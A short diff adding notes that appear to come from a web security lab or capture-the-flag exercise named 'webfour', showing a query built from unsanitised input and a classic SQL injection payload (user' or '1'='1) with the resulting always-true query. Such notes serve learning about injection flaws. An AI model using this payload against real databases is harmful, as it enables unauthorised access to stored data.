@@ -1,0 +1,12 @@
+Original Query: SELECT * FROM webfour.webfour where name = '$input'
+
+Your Resulting Query: SELECT * FROM webfour.webfour where name = ''
+
+0 results
+
+
+
+
+exploit query
+user' or '1'='1
+Your Resulting Query: SELECT * FROM webfour.webfour where name = 'user' or '1'='1'
